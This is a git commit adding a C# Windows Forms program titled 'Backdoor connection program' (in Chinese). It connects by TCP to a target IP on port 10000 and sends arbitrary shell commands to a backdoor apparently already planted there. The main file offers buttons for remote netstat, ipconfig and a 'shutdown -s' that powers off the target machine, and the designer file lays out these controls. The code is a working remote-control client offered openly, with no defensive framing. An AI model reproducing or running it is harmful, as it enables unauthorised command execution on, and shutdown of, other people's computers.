6dfd55f4b8cc94b338a0d464969d477d733d83a4
zhengwei <b840615@gmail.com>
2017-06-19 10:58:25 +0800

    first add all

---
+++ Backup/telnetcmd/Form1.cs
@@ -0,0 +1,222 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Windows.Forms;
+using System.Net.Sockets;
+using System.IO;
+using System.Net;
+using System.Text.RegularExpressions;
+using System.Threading;
+
+namespace telnetcmd
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+        }
+        public static NetworkStream stream;
+        public static TcpClient tcpclient;
+        public static string ip;
+        public static int port;
+        Socket SckSPort; // 先行宣告Socket
+        StreamReader sr ;
+        StreamWriter sw;
+        RichTextBox rb = new RichTextBox();
+        Thread SckSReceiveTd;
+        string RmIp;
+        string value = "", cmdin = "";
+        public delegate void mydalegate();
+        public mydalegate md;
+        string s;
+        bool streamout = false;
+        int SPort = 6101;
+
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            telnetstart();
+        }
+      
+
+
+        public void telnetstart()
+        {
+            Console.WriteLine("目標IP:");
+            // ip = textBox1.Text;
+            if(InputBox("IP輸入", "輸入目標主機IP address : ", ref value)
+                ==DialogResult.OK)
+            ip = value;
+
+            Console.WriteLine("目標Port:");
+            // port = int.Parse(textBox2.Text);
+            port = 10000;
+            label1.Text = "連線成功!!\n目標的IP : " + ip 
+                + "\n\n目標的Port : " + port.ToString();
+
+            tcpclient = new TcpClient(ip, port);  // 連接服務器
+            stream = tcpclient.GetStream();   // 獲取網絡數據流對象
+               sw = new StreamWriter(stream); //將輸入資料傳到sever
+               sr = new StreamReader(stream, Encoding
+                   .GetEncoding(950));//讀取sever端回傳的資訊
+                                      //且編碼為big-5
+            
+           SckSReceiveTd = new Thread(Runtelnet);//將傳資料及讀資料
+                                                 //的function改為用
+                                                 //多執行緒執行
+            SckSReceiveTd.Start();
+     
+        }
+
+       public void Runtelnet()
+        {
+
+                   while (true)
+                {
+                    stream.ReadTimeout = 10;
+                   
+                    try
+                    {
+                        while (!sr.EndOfStream)   //判斷是否還有資料未接收
+                        {
+
+                           string c = sr.ReadLine();
+                            s = s+"\n"+c;        //讀取資料存在S裡                     
+                            Console.WriteLine(c);
+                        }
+                    }
+                    catch(Exception e)
+                    {
+                     
+                    }
+                    streamout = true;
+
+                    if (!String.IsNullOrEmpty(cmdin))
+                    {
+                        sw.Write("{0}\r\n", cmdin);  //傳入指令，指令存在cmdin裡
+                        cmdin = "";
+                    }
+                    sw.Flush();   //傳送端資料更新
+     
+                }
+            
+
+
+        }
+       private void button3_Click(object sender, EventArgs e)
+       {
+           DialogResult inputresult = InputBox("指令視窗", "輸入指令 : ", ref value);
+           if (inputresult == DialogResult.OK)
+           {
+               cmdin = value;
+           }    
+            else
+            {
+                       
+           }
+       }    
+
+    
+
+        private void timer1_Tick(object sender, EventArgs e)
+        {
+            
+            if (streamout)  //timer會固定來判斷是否有資料
+            {
+                
+                richTextBox1.Text = richTextBox1.Text + s;
+                streamout = false;//有資料時輸出至richtextBox
+                s = "";
+            }
+        }
+        public static DialogResult InputBox(string title, string promptText, ref string value)
+        {
+            Form form = new Form();
+            Label label = new Label();
+            TextBox textBox = new TextBox();
+            Button buttonOk = new Button();
+            Button buttonCancel = new Button();
+
+            form.Text = title;
+            label.Text = promptText;
+            textBox.Text = value;
+
+            buttonOk.Text = "OK";
+            buttonCancel.Text = "Cancel";
+            buttonOk.DialogResult = DialogResult.OK;
+            buttonCancel.DialogResult = DialogResult.Cancel;
+
+            label.SetBounds(9, 20, 372, 13);
+            textBox.SetBounds(12, 36, 372, 20);
+            buttonOk.SetBounds(228, 72, 75, 23);
+            buttonCancel.SetBounds(309, 72, 75, 23);
+
+            label.AutoSize = true;
+            textBox.Anchor = textBox.Anchor | AnchorStyles.Right;
+            buttonOk.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
+            buttonCancel.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
+
+            form.ClientSize = new Size(396, 107);
+            form.Controls.AddRange(new Control[] { label, textBox, buttonOk, buttonCancel });
+            form.ClientSize = new Size(Math.Max(300, label.Right + 10), form.ClientSize.Height);
+            form.FormBorderStyle = FormBorderStyle.FixedDialog;
+            form.StartPosition = FormStartPosition.CenterScreen;
+            form.MinimizeBox = false;
+            form.MaximizeBox = false;
+            form.AcceptButton = buttonOk;
+            form.CancelButton = buttonCancel;
+
+            DialogResult dialogResult = form.ShowDialog();
+            value = textBox.Text;
+            return dialogResult;
+        }
+
+        private void button6_Click(object sender, EventArgs e)
+        {
+            richTextBox1.Text = ""; //將連線斷線初始化
+            label1.Text = "尚未連接";
+            SckSReceiveTd.Abort();
+            stream.Close();
+            tcpclient.Close();
+        }
+
+        private void button4_Click(object sender, EventArgs e)
+        {
+          
+            cmdin = "netstat -an";//獲取PORT資訊
+        }
+
+        private void button5_Click(object sender, EventArgs e)
+        {
+        
+            cmdin = "ipconfig";//獲取IP
+        }
+        private void button2_Click(object sender, EventArgs e)
+        {
+            cmdin = "shutdown -s";//將sever關機
+        }
+
+        private void button7_Click(object sender, EventArgs e)
+        {
+            richTextBox1.Text = "";//清除畫面
+        }
+
+
+
+     
+
+   
+
+
+
+
+
+
+
+    }
+}
---
+++ telnetcmd/Form1.Designer.cs
@@ -0,0 +1,169 @@
+﻿namespace telnetcmd
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// 設計工具所需的變數。
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// 清除任何使用中的資源。
+        /// </summary>
+        /// <param name="disposing">如果應該處置 Managed 資源則為 true，否則為 false。</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form 設計工具產生的程式碼
+
+        /// <summary>
+        /// 此為設計工具支援所需的方法 - 請勿使用程式碼編輯器修改這個方法的內容。
+        ///
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.components = new System.ComponentModel.Container();
+            this.button1 = new System.Windows.Forms.Button();
+            this.button2 = new System.Windows.Forms.Button();
+            this.richTextBox1 = new System.Windows.Forms.RichTextBox();
+            this.timer1 = new System.Windows.Forms.Timer(this.components);
+            this.button3 = new System.Windows.Forms.Button();
+            this.button4 = new System.Windows.Forms.Button();
+            this.button5 = new System.Windows.Forms.Button();
+            this.button6 = new System.Windows.Forms.Button();
+            this.label1 = new System.Windows.Forms.Label();
+            this.button7 = new System.Windows.Forms.Button();
+            this.SuspendLayout();
+            // 
+            // button1
+            // 
+            this.button1.Location = new System.Drawing.Point(282, 212);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(112, 48);
+            this.button1.TabIndex = 0;
+            this.button1.Text = "建立連線";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // button2
+            // 
+            this.button2.Location = new System.Drawing.Point(400, 73);
+            this.button2.Name = "button2";
+            this.button2.Size = new System.Drawing.Size(59, 42);
+            this.button2.TabIndex = 1;
+            this.button2.Text = "關機";
+            this.button2.UseVisualStyleBackColor = true;
+            this.button2.Click += new System.EventHandler(this.button2_Click);
+            // 
+            // richTextBox1
+            // 
+            this.richTextBox1.Location = new System.Drawing.Point(13, 19);
+            this.richTextBox1.Name = "richTextBox1";
+            this.richTextBox1.Size = new System.Drawing.Size(381, 165);
+            this.richTextBox1.TabIndex = 2;
+            this.richTextBox1.Text = "";
+            // 
+            // timer1
+            // 
+            this.timer1.Enabled = true;
+            this.timer1.Tick += new System.EventHandler(this.timer1_Tick);
+            // 
+            // button3
+            // 
+            this.button3.Location = new System.Drawing.Point(400, 19);
+            this.button3.Name = "button3";
+            this.button3.Size = new System.Drawing.Size(59, 48);
+            this.button3.TabIndex = 5;
+            this.button3.Text = "CMD指令輸入";
+            this.button3.UseVisualStyleBackColor = true;
+            this.button3.Click += new System.EventHandler(this.button3_Click);
+            // 
+            // button4
+            // 
+            this.button4.Location = new System.Drawing.Point(400, 121);
+            this.button4.Name = "button4";
+            this.button4.Size = new System.Drawing.Size(59, 42);
+            this.button4.TabIndex = 6;
+            this.button4.Text = "Port資訊";
+            this.button4.UseVisualStyleBackColor = true;
+            this.button4.Click += new System.EventHandler(this.button4_Click);
+            // 
+            // button5
+            // 
+            this.button5.Location = new System.Drawing.Point(400, 169);
+            this.button5.Name = "button5";
+            this.button5.Size = new System.Drawing.Size(59, 42);
+            this.button5.TabIndex = 7;
+            this.button5.Text = "IP資訊";
+            this.button5.UseVisualStyleBackColor = true;
+            this.button5.Click += new System.EventHandler(this.button5_Click);
+            // 
+            // button6
+            // 
+            this.button6.Location = new System.Drawing.Point(400, 218);
+            this.button6.Name = "button6";
+            this.button6.Size = new System.Drawing.Size(59, 42);
+            this.button6.TabIndex = 8;
+            this.button6.Text = "斷線";
+            this.button6.UseVisualStyleBackColor = true;
+            this.button6.Click += new System.EventHandler(this.button6_Click);
+            // 
+            // label1
+            // 
+            this.label1.BorderStyle = System.Windows.Forms.BorderStyle.Fixed3D;
+            this.label1.Location = new System.Drawing.Point(13, 209);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(263, 50);
+            this.label1.TabIndex = 9;
+            // 
+            // button7
+            // 
+            this.button7.Location = new System.Drawing.Point(341, 19);
+            this.button7.Name = "button7";
+            this.button7.Size = new System.Drawing.Size(53, 33);
+            this.button7.TabIndex = 10;
+            this.button7.Text = "清除";
+            this.button7.UseVisualStyleBackColor = true;
+            this.button7.Click += new System.EventHandler(this.button7_Click);
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 12F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(471, 261);
+            this.Controls.Add(this.button7);
+            this.Controls.Add(this.label1);
+            this.Controls.Add(this.button6);
+            this.Controls.Add(this.button5);
+            this.Controls.Add(this.button4);
+            this.Controls.Add(this.button3);
+            this.Controls.Add(this.richTextBox1);
+            this.Controls.Add(this.button2);
+            this.Controls.Add(this.button1);
+            this.Name = "Form1";
+            this.Text = "Backdoor連線程式";
+            this.ResumeLayout(false);
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.Button button2;
+        private System.Windows.Forms.RichTextBox richTextBox1;
+        private System.Windows.Forms.Timer timer1;
+        private System.Windows.Forms.Button button3;
+        private System.Windows.Forms.Button button4;
+        private System.Windows.Forms.Button button5;
+        private System.Windows.Forms.Button button6;
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.Button button7;
+    }
+}
+
